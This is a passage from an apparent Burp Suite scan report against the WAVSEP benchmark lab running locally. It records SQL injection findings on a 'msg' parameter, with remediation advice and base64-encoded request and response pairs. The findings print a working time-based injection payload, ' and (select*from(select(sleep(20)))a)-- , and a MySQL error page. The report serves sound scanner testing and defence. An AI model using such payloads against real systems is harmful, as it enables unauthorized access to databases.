      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjAzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgY29sdW1ucyBvZiB0YWJsZXMgJ3VzZXJzJzwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>577724755572297728</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case06-InjectionInSearch-ListingDatabaseTableRecords-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case06-InjectionInSearch-ListingDatabaseTableRecords-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA2LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlUmVjb3Jkcy1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1Nzo0NSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA2LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlUmVjb3Jkcy1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDYgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgcmVjb3JkcyBvZiB0YWJsZXMgJ3VzZXJzJzwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA2LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlUmVjb3Jkcy1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjAgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU4OjA0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDYgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgcmVjb3JkcyBvZiB0YWJsZXMgJ3VzZXJzJzwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6108476596321136640</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case07-InjectionInSearch-RetrieveCurrentUserDetails-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case07-InjectionInSearch-RetrieveCurrentUserDetails-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTA3LUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlQ3VycmVudFVzZXJEZXRhaWxzLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1Nzo0NSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
